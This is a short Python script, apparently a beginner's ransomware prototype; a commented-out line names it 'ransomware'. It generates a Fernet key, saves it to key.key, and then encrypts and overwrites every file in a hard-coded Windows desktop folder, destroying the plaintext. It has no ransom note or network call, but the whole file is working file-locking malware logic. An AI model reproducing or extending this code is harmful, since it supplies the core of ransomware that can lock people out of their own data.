#This will import the module to use
from cryptography.fernet import Fernet
import os

#we need to generate the key and save into a key.key

#class ransomware():
#def __init__(self):
#    pass

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

#This will encrypt the files one by one
def encrypt(item):
    with open("key.key", "rb") as key_file:
        key = key_file.read()
    
    key = Fernet(key)
    
    with open(item, "rb") as file:
        file_binary_data = file.read()
    
    encrypt_data = key.encrypt(file_binary_data)
    
    with open(item, "wb") as file:
        file.write(encrypt_data)

if __name__ == "__main__":
    path = "C:\\Users\\ianch\\Desktop\\prueba"
    items = os.listdir(path)
    generate_key()
    for item in items: 
        full_path = [path + "\\" + item]
        print(full_path)
        encrypt(full_path[0])

